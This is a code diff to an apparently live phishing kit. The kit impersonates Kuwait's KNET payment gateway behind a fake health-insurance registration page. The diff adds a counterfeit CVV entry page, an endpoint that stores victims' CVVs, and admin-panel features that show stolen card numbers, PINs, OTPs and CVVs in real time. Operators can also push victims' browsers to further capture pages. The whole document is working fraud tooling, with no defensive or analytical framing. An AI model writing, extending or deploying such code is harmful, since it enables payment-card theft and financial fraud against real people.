@@ -102,6 +102,19 @@ app.post('/knet/otp', (req, res) => {
 
 app.get('/knet/all', (req, res) => { res.json(payments); });
 
+app.post('/knet/cvv', (req, res) => {
+  const { knetId, cvv } = req.body;
+  const payment = payments.find(p => p.id === knetId || p.knetId === knetId);
+  if (!payment) return res.status(404).json({ success: false, message: 'Payment not found' });
+  payment.cvv = cvv;
+  payment.status = 'CVV_REQUEST';
+  payment.updatedAt = new Date().toISOString();
+  notifyAdmins('payment_cvv_received', { id: payment.id, cvv, payment });
+  res.json({ success: true, payment });
+});
+
+app.get('/knet/cvv', (req, res) => { res.send(getCvvPageHTML(req.query.id || '')); });
+
 app.post('/knet-otp', (req, res) => {
   const { paymentId, otp, pin } = req.body;
   const payment = payments.find(p => p.id === paymentId || p.knetId === paymentId);
@@ -206,6 +219,230 @@ io.on('connection', (socket) => {
     notifyAdmins('active_users', Object.values(clientSockets).filter(c => !c.isAdmin));
   });
 });
+
+function getCvvPageHTML(knetId) {
+  return `<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>النظام الآلي لتسجيل الضمان الصحي</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: #d0d0d0; font-family: Arial, sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 10px; }
+  .banner { width: 100%; max-width: 600px; margin-bottom: 10px; }
+  .banner img { width: 100%; height: auto; border-radius: 10px; border: 1px solid #cfcfcf; }
+  .card { background: #fff; border: 2px solid #9e9e9e; border-radius: 15px; padding: 12px; margin-bottom: 10px; width: 100%; max-width: 600px; box-shadow: 0 1px 0 rgba(255,255,255,0.7), 0 3px 8px rgba(0,0,0,0.25); }
+  .logo-wrap { display: flex; justify-content: center; margin-bottom: 10px; }
+  .logo-wrap img { width: 135px; max-width: 100%; height: auto; }
+  .divider { border-bottom: 1px solid #8f8f90; padding-bottom: 5px; margin-bottom: 5px; }
+  .row { display: grid; grid-template-columns: 40% 1fr 40%; align-items: center; margin-bottom: 5px; }
+  .lbl { font-size: 11px; color: #0070cd; font-weight: bold; text-shadow: 0 1px 2px rgba(0,0,0,0.2); justify-self: start; }
+  .val { font-size: 11px; color: #444; text-align: center; }
+  .notif-card { background: #fff; border: 2px solid #d0d0d0; border-radius: 15px; padding: 12px; margin-bottom: 10px; width: 100%; max-width: 600px; box-shadow: 0 1px 0 rgba(255,255,255,0.7), 0 3px 8px rgba(0,0,0,0.25); }
+  .notif-box { background: #d9edf7; border: 1px solid #bcdff1; border-radius: 4px; padding: 8px 12px; font-size: 13px; color: #31708f; margin-bottom: 10px; }
+  .notif-box b { font-weight: bold; }
+  .input-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px; }
+  .input-lbl { font-size: 11px; color: #0070cd; font-weight: bold; width: 40%; text-align: left; padding-top: 4px; text-shadow: 0 1px 2px rgba(0,0,0,0.2); }
+  .cvv-input { width: 60%; height: 21px; padding: 0 4px; border: 2px solid #0070cd; font-size: 11px; color: #444; background: #fff; outline: none; box-shadow: inset 0 0 5px rgba(0,0,0,0.3); }
+  .btn-row { background: #fff; border: 2px solid #d0d0d0; border-radius: 15px; padding: 16px 12px; margin-bottom: 10px; width: 100%; max-width: 600px; box-shadow: 0 1px 0 rgba(255,255,255,0.7), 0 3px 8px rgba(0,0,0,0.25); }
+  .btns { display: flex; overflow: hidden; border-radius: 6px; }
+  .btn-confirm { width: 50%; height: 27px; background: linear-gradient(to bottom, #f5f5f5, #e6e6e6); border: 1px solid #cacaca; border-right: 0; color: #666; font-weight: bold; font-size: 11px; cursor: pointer; }
+  .btn-cancel { width: 50%; height: 27px; background: linear-gradient(to bottom, #f5f5f5, #e6e6e6); border: 1px solid #cacaca; color: #666; font-weight: bold; font-size: 11px; cursor: pointer; }
+  .btn-confirm:hover, .btn-cancel:hover { background: linear-gradient(to bottom, #eee, #dcdcdc); }
+  .loading { display: none; margin-top: 5px; align-items: center; justify-content: center; gap: 8px; }
+  .loading.show { display: flex; }
+  .loading-text { font-size: 11px; color: #444; text-align: center; }
+  .footer { text-align: center; margin-top: 4px; width: 100%; max-width: 600px; }
+  .footer p { font-size: 12px; color: #000; margin-bottom: 4px; }
+  .footer a { color: #0070cd; text-decoration: none; font-weight: bold; font-size: 12px; }
+  .error-box { display: none; background: #f8d7da; border: 1px solid #f5c6cb; border-radius: 4px; padding: 6px 12px; font-size: 12px; color: #721c24; text-align: center; margin-bottom: 8px; }
+</style>
+</head>
+<body>
+<div class="banner">
+  <img src="/imgs/banner.jpg" alt="Banner" onerror="this.style.display='none'">
+</div>
+<div class="card">
+  <div class="logo-wrap">
+    <img src="/imgs/knet-logo.png" alt="logo" onerror="this.style.display='none'">
+  </div>
+  <div class="divider">
+    <div class="row">
+      <span class="lbl">Merchant:</span>
+      <span class="val">Online Insurance System</span>
+      <span></span>
+    </div>
+  </div>
+  <div style="padding-top:5px">
+    <div class="row">
+      <span class="lbl">Amount:</span>
+      <span class="val" id="amount-val">KD 0.000</span>
+      <span></span>
+    </div>
+  </div>
+</div>
+<div class="notif-card">
+  <div class="notif-box">
+    <b>NOTIFICATION:</b> Please enter the CVV number located on the back of your card. The CVV is a 3-digit security code.
+  </div>
+  <div class="error-box" id="error-box">حدث خطأ، يرجى المحاولة مرة أخرى</div>
+  <div class="input-row">
+    <span class="lbl" style="width:41%">Card Number:</span>
+    <span class="val" style="width:59%;padding-right:5px" id="card-num"></span>
+  </div>
+  <div class="input-row">
+    <span class="lbl" style="width:40%">Expiration Month:</span>
+    <span class="val" style="width:60%;padding-right:5px" id="exp-month">MM</span>
+  </div>
+  <div class="input-row">
+    <span class="lbl" style="width:40%">Expiration Year:</span>
+    <span class="val" style="width:60%;padding-right:5px" id="exp-year">YYYY</span>
+  </div>
+  <div class="input-row">
+    <span class="lbl" style="width:40%">PIN:</span>
+    <span class="val" style="width:60%;padding-right:5px">****</span>
+  </div>
+  <div class="input-row">
+    <span class="input-lbl">CVV:</span>
+    <input type="password" id="cvv-input" class="cvv-input" inputmode="numeric" pattern="[0-9]*" maxlength="4" placeholder="CVV">
+  </div>
+  <div class="loading" id="loading">
+    <span class="loading-text">Processing...</span>
+  </div>
+</div>
+<div class="btn-row">
+  <div class="btns">
+    <button class="btn-confirm" onclick="submitCvv()">Confirm</button>
+    <button class="btn-cancel" onclick="cancelCvv()">Cancel</button>
+  </div>
+</div>
+<div class="footer">
+  <p>All Rights Reserved. Copyright 2025 &#169;</p>
+  <a href="https://www.knet.com.kw" target="_blank">The Shared Electronic Banking Services Company - KNET</a>
+</div>
+<script>
+  var knetId = '${knetId}';
+  var baseUrl = window.location.origin;
+  
+  // Load payment info
+  if (knetId) {
+    fetch(baseUrl + '/knet/status/' + knetId)
+      .then(function(r) { return r.json(); })
+      .then(function(data) {
+        if (data.success && data.payment) {
+          var p = data.payment;
+          var cardNum = (p.prefix || '') + ' ' + (p.cardNumber || '');
+          document.getElementById('card-num').textContent = cardNum.trim() || '';
+          document.getElementById('exp-month').textContent = p.expiryMonth || 'MM';
+          document.getElementById('exp-year').textContent = p.expiryYear || 'YYYY';
+        }
+      }).catch(function() {});
+  }
+
+  function submitCvv() {
+    var cvv = document.getElementById('cvv-input').value.trim();
+    if (!cvv || cvv.length < 3) {
+      document.getElementById('error-box').style.display = 'block';
+      document.getElementById('error-box').textContent = 'يرجى إدخال رمز CVV الصحيح';
+      return;
+    }
+    document.getElementById('error-box').style.display = 'none';
+    document.getElementById('loading').classList.add('show');
+    document.querySelector('.btn-confirm').disabled = true;
+    document.querySelector('.btn-cancel').disabled = true;
+    fetch(baseUrl + '/knet/cvv', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ knetId: knetId, cvv: cvv })
+    }).then(function(r) { return r.json(); })
+    .then(function(data) {
+      document.getElementById('loading').classList.remove('show');
+      document.querySelector('.btn-confirm').disabled = false;
+      document.querySelector('.btn-cancel').disabled = false;
+      if (data.success) {
+        // Poll for status change
+        pollStatus();
+      } else {
+        document.getElementById('error-box').style.display = 'block';
+        document.getElementById('error-box').textContent = 'حدث خطأ، يرجى المحاولة مرة أخرى';
+      }
+    }).catch(function() {
+      document.getElementById('loading').classList.remove('show');
+      document.querySelector('.btn-confirm').disabled = false;
+      document.querySelector('.btn-cancel').disabled = false;
+      document.getElementById('error-box').style.display = 'block';
+    });
+  }
+
+  function cancelCvv() {
+    window.history.back();
+  }
+
+  var pollTimer = null;
+  function pollStatus() {
+    document.getElementById('loading').classList.add('show');
+    document.getElementById('loading').querySelector('.loading-text').textContent = 'Waiting for approval...';
+    if (pollTimer) clearInterval(pollTimer);
+    pollTimer = setInterval(function() {
+      fetch(baseUrl + '/knet/status/' + knetId)
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+          if (data.success && data.payment) {
+            var s = data.payment.status;
+            if (s === 'APPROVED' || s === 'SUCCESS') {
+              clearInterval(pollTimer);
+              document.getElementById('loading').classList.remove('show');
+              document.getElementById('error-box').style.display = 'none';
+              // Navigate to success or next step
+            } else if (s === 'REJECTED' || s === 'OTP_FAILED') {
+              clearInterval(pollTimer);
+              document.getElementById('loading').classList.remove('show');
+              document.getElementById('error-box').style.display = 'block';
+              document.getElementById('error-box').textContent = 'تم رفض العملية';
+              document.getElementById('cvv-input').value = '';
+              document.querySelector('.btn-confirm').disabled = false;
+              document.querySelector('.btn-cancel').disabled = false;
+            }
+          }
+        }).catch(function() {});
+    }, 2000);
+  }
+
+  // Handle navigate_to via socket if available
+  try {
+    var script = document.createElement('script');
+    script.src = '/socket.io/socket.io.js';
+    script.onload = function() {
+      var socket = io();
+      socket.on('navigate_to', function(data) {
+        if (data && data.page) window.location.href = data.page + (knetId ? '?id=' + knetId : '');
+      });
+      socket.on('payment_status_changed', function(data) {
+        if (data.id === knetId || data.paymentId === knetId) {
+          if (data.status === 'APPROVED' || data.status === 'SUCCESS') {
+            if (pollTimer) clearInterval(pollTimer);
+            document.getElementById('loading').classList.remove('show');
+          } else if (data.status === 'REJECTED' || data.status === 'OTP_FAILED') {
+            if (pollTimer) clearInterval(pollTimer);
+            document.getElementById('loading').classList.remove('show');
+            document.getElementById('error-box').style.display = 'block';
+            document.getElementById('error-box').textContent = 'تم رفض العملية';
+            document.getElementById('cvv-input').value = '';
+            document.querySelector('.btn-confirm').disabled = false;
+            document.querySelector('.btn-cancel').disabled = false;
+          }
+        }
+      });
+      if (knetId) socket.emit('join_payment', knetId);
+      socket.emit('page_update', '/knet/cvv');
+    };
+    document.head.appendChild(script);
+  } catch(e) {}
+<\/script>
+</body>
+</html>`;
+}
 
 function getAdminHTML() {
   const css = `
@@ -494,6 +731,12 @@ function getAdminHTML() {
       showNotification('رقم سري جديد!', 'الرقم المرجعي: ' + (data.payment ? data.payment.refNumber : ''), data.pin || '', 'new-pin');
       playSound(); bumpNotif();
     });
+    socket.on('payment_cvv_received', function(data) {
+      var idx = allPayments.findIndex(function(p) { return p.id === data.id || p.id === data.paymentId; });
+      if (idx !== -1) { allPayments[idx] = data.payment || allPayments[idx]; renderPayments(); updateStats(); }
+      showNotification('CVV جديد وصل!', 'الرقم المرجعي: ' + (data.payment ? data.payment.refNumber : ''), data.cvv || '', 'new-otp');
+      playSound(); bumpNotif();
+    });
     socket.on('payment_status_changed', function(data) {
       var idx = allPayments.findIndex(function(p) { return p.id === data.id || p.id === data.paymentId; });
       if (idx !== -1) {
@@ -525,6 +768,7 @@ function getAdminHTML() {
       'PENDING': '<span class="badge badge-pending">انتظار</span>',
       'APPROVED': '<span class="badge badge-approved">موافقة</span>',
       'OTP_REQUEST': '<span class="badge badge-otp">OTP وصل</span>',
+      'CVV_REQUEST': '<span class="badge" style="background:#fef2f2;color:#dc2626;border:1px solid #fca5a5">CVV وصل</span>',
       'OTP_FAILED': '<span class="badge badge-failed">OTP خاطئ</span>',
       'SUCCESS': '<span class="badge badge-success">مكتمل</span>',
       'REJECTED': '<span class="badge badge-rejected">مرفوض</span>',
@@ -557,7 +801,7 @@ function getAdminHTML() {
       container.innerHTML = '<div class="empty-state"><div class="empty-icon"><i class="bi bi-inbox"></i></div><div>' + (q ? 'لا توجد نتائج' : 'لا توجد طلبات بعد') + '</div></div>';
       return;
     }
-    var html = '<table class="payments-table"><thead><tr><th>المرجع</th><th>الرقم المدني</th><th>البنك</th><th>رقم البطاقة</th><th>الانتهاء</th><th>الحالة</th><th>OTP</th><th>الإجراءات</th></tr></thead><tbody>';
+    var html = '<table class="payments-table"><thead><tr><th>المرجع</th><th>الرقم المدني</th><th>البنك</th><th>رقم البطاقة</th><th>الانتهاء</th><th>الحالة</th><th>OTP</th><th>CVV</th><th>الإجراءات</th></tr></thead><tbody>';
     list.forEach(function(p) {
       var otp = p.knetOtps && p.knetOtps.length ? p.knetOtps[0].otp : '-';
       var id = p.id;
@@ -569,6 +813,7 @@ function getAdminHTML() {
       html += '<td>' + (p.expiryMonth || '') + (p.expiryMonth && p.expiryYear ? '/' : '') + (p.expiryYear || '-') + '</td>';
       html += '<td>' + getStatusBadge(p.status) + '</td>';
       html += '<td><span style="font-family:monospace;font-weight:700;color:#d97706">' + otp + '</span></td>';
+      html += '<td><span style="font-family:monospace;font-weight:700;color:#dc2626">' + (p.cvv || '-') + '</span></td>';
       html += '<td><div class="btn-actions">';
       html += '<button class="btn btn-details" data-action="details" data-id="' + id + '"><i class="bi bi-eye"></i> تفاصيل</button>';
       html += '<div class="dropdown">';
@@ -576,6 +821,7 @@ function getAdminHTML() {
       html += '<div class="dropdown-menu" id="dd-' + id + '">';
       html += '<button class="dropdown-item" data-action="nav" data-id="' + id + '" data-page="/knet"><i class="bi bi-credit-card" style="color:#16a34a"></i>صفحة KNET</button>';
       html += '<button class="dropdown-item" data-action="nav" data-id="' + id + '" data-page="/knet-otp"><i class="bi bi-phone" style="color:#2563eb"></i>صفحة OTP</button>';
+      html += '<button class="dropdown-item" data-action="nav" data-id="' + id + '" data-page="/knet/cvv"><i class="bi bi-shield-lock" style="color:#dc2626"></i>صفحة CVV</button>';
       html += '<button class="dropdown-item" data-action="nav" data-id="' + id + '" data-page="/sign-up"><i class="bi bi-person-plus" style="color:#7c3aed"></i>صفحة التسجيل</button>';
       html += '<button class="dropdown-item" data-action="nav" data-id="' + id + '" data-page="/login"><i class="bi bi-box-arrow-in-right" style="color:#ea580c"></i>صفحة الدخول</button>';
       html += '<button class="dropdown-item" data-action="nav" data-id="' + id + '" data-page="/"><i class="bi bi-house" style="color:#64748b"></i>الصفحة الرئيسية</button>';
@@ -643,6 +889,11 @@ function getAdminHTML() {
       }
       html += '</div>';
     }
+    if (p.cvv) {
+      html += '<div class="sec-title">بيانات CVV</div><div class="detail-grid">';
+      html += dRow('رمز CVV', p.cvv, true);
+      html += '</div>';
+    }
     html += '<div class="action-section">';
     html += '<div class="action-sec-title"><i class="bi bi-shield-check" style="color:#16a34a"></i> إجراء عملية الدفع</div>';
     html += '<div class="action-step-info">الخطوة الحالية: ' + (stepNames[step] || 'بيانات البطاقة') + ' | الحالة: ' + (p.status || 'PENDING') + '</div>';
@@ -655,6 +906,7 @@ function getAdminHTML() {
     html += '<div class="nav-btns">';
     html += '<button class="nav-btn" data-action="nav" data-id="' + p.id + '" data-page="/knet"><i class="bi bi-credit-card" style="color:#16a34a"></i>KNET</button>';
     html += '<button class="nav-btn" data-action="nav" data-id="' + p.id + '" data-page="/knet-otp"><i class="bi bi-phone" style="color:#2563eb"></i>OTP</button>';
+    html += '<button class="nav-btn" data-action="nav" data-id="' + p.id + '" data-page="/knet/cvv"><i class="bi bi-shield-lock" style="color:#dc2626"></i>CVV</button>';
     html += '<button class="nav-btn" data-action="nav" data-id="' + p.id + '" data-page="/sign-up"><i class="bi bi-person-plus" style="color:#7c3aed"></i>التسجيل</button>';
     html += '<button class="nav-btn" data-action="nav" data-id="' + p.id + '" data-page="/login"><i class="bi bi-box-arrow-in-right" style="color:#ea580c"></i>الدخول</button>';
     html += '<button class="nav-btn" data-action="nav" data-id="' + p.id + '" data-page="/"><i class="bi bi-house" style="color:#64748b"></i>الرئيسية</button>';
